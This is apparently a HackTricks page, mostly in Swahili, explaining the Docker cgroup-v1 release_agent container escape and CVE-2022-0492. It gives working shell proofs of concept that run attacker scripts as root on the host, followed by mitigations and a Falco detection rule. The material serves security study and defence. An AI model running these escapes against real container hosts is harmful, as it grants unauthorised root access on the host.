# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**Kwa maelezo zaidi, rejelea** [**blogu ya asili**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Hii ni muhtasari tu:

---

## Classic PoC (2019)
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
The PoC inatumia kipengele cha **cgroup-v1** `release_agent`: wakati kazi ya mwisho ya cgroup ambayo ina `notify_on_release=1` inatoka, kernel (katika **namespaces za awali kwenye mwenyeji**) inatekeleza programu ambayo jina lake la faili limehifadhiwa katika faili inayoweza kuandikwa `release_agent`. Kwa sababu utekelezaji huo unafanyika kwa **haki kamili za mzizi kwenye mwenyeji**, kupata ufikiaji wa kuandika kwenye faili hiyo inatosha kwa kutoroka kwa kontena.

### Mwongozo mfupi, unaosomwa

1. **Andaa cgroup mpya**

```shell
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp   # au –o memory
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```

2. **Elekeza `release_agent` kwa skripti inayodhibitiwa na mshambuliaji kwenye mwenyeji**

```shell
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

3. **Angusha payload**

```shell
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > "$host_path/output"
EOF
chmod +x /cmd
```

4. **Chochea notifier**

```shell
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"   # ongeza sisi wenyewe na kutoka mara moja
cat /output                                  # sasa ina michakato ya mwenyeji
```

---

## Uthibitisho wa kernel wa 2022 – CVE-2022-0492

Mnamo Februari 2022, Yiqi Sun na Kevin Wang waligundua kwamba **kernel haiku *hakikisha* uwezo wakati mchakato ulipokuwa unandika kwenye `release_agent` katika cgroup-v1** (kazi `cgroup_release_agent_write`).

Kwa ufanisi **mchakato wowote ambao ungeweza kuunganisha hifadhi ya cgroup (kwa mfano kupitia `unshare -UrC`) ungeweza kuandika njia yoyote kwenye `release_agent` bila `CAP_SYS_ADMIN` katika *namespace* ya mtumiaji ya awali**. Katika kontena la Docker/Kubernetes linaloendesha mzizi lililowekwa kwa default, hili liliruhusu:

* kupandisha hadhi hadi mzizi kwenye mwenyeji; ↗
* kutoroka kwa kontena bila kontena kuwa na haki.

Kasoro hiyo ilipewa **CVE-2022-0492** (CVSS 7.8 / Juu) na kutatuliwa katika toleo zifuatazo za kernel (na zote zinazofuata):

* 5.16.2, 5.15.17, 5.10.93, 5.4.176, 4.19.228, 4.14.265, 4.9.299.

Patch commit: `1e85af15da28 "cgroup: Fix permission checking"`.

### Uthibitisho mdogo ndani ya kontena
```bash
# prerequisites: container is run as root, no seccomp/AppArmor profile, cgroup-v1 rw inside
apk add --no-cache util-linux  # provides unshare
unshare -UrCm sh -c '
mkdir /tmp/c; mount -t cgroup -o memory none /tmp/c;
echo 1 > /tmp/c/notify_on_release;
echo /proc/self/exe > /tmp/c/release_agent;     # will exec /bin/busybox from host
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Ikiwa kernel ina udhaifu, binary ya busybox kutoka kwa *host* inatekelezwa na root kamili.

### Kuimarisha & Kupunguza

* **Sasisha kernel** (≥ toleo za juu). Patch sasa inahitaji `CAP_SYS_ADMIN` katika *namespace* ya mtumiaji wa *mwanzo* kuandika kwenye `release_agent`.
* **Prefer cgroup-v2** – hiyerarhii iliyounganishwa **imeondoa kabisa kipengele cha `release_agent`**, ikiondoa daraja hili la kutoroka.
* **Zima namespaces za watumiaji wasio na mamlaka** kwenye hosts ambazo hazihitaji:
```shell
sysctl -w kernel.unprivileged_userns_clone=0
```
* **Udhibiti wa ufikiaji wa lazima**: Sera za AppArmor/SELinux zinazokataa `mount`, `openat` kwenye `/sys/fs/cgroup/**/release_agent`, au kuondoa `CAP_SYS_ADMIN`, husitisha mbinu hata kwenye kernels zenye udhaifu.
* **Bind-mask isiyo na kusoma** faili zote za `release_agent` (mfano wa skripti ya Palo Alto):
```shell
for f in $(find /sys/fs/cgroup -name release_agent); do
mount --bind -o ro /dev/null "$f"
done
```

## Ugunduzi wakati wa utekelezaji

[`Falco`](https://falco.org/) inatoa sheria iliyojengwa ndani tangu v0.32:
```yaml
- rule: Detect release_agent File Container Escapes
desc: Detect an attempt to exploit a container escape using release_agent
condition: open_write and container and fd.name endswith release_agent and
(user.uid=0 or thread.cap_effective contains CAP_DAC_OVERRIDE) and
thread.cap_effective contains CAP_SYS_ADMIN
output: "Potential release_agent container escape (file=%fd.name user=%user.name cap=%thread.cap_effective)"
priority: CRITICAL
tags: [container, privilege_escalation]
```
Kanuni inasababisha kwenye jaribio lolote la kuandika kwenye `*/release_agent` kutoka kwa mchakato ndani ya kontena ambalo bado lina `CAP_SYS_ADMIN`.

## Marejeleo

* [Unit 42 – CVE-2022-0492: container escape via cgroups](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/) – uchambuzi wa kina na skripti ya kupunguza.
* [Sysdig Falco rule & detection guide](https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/)

{{#include ../../../../banners/hacktricks-training.md}}
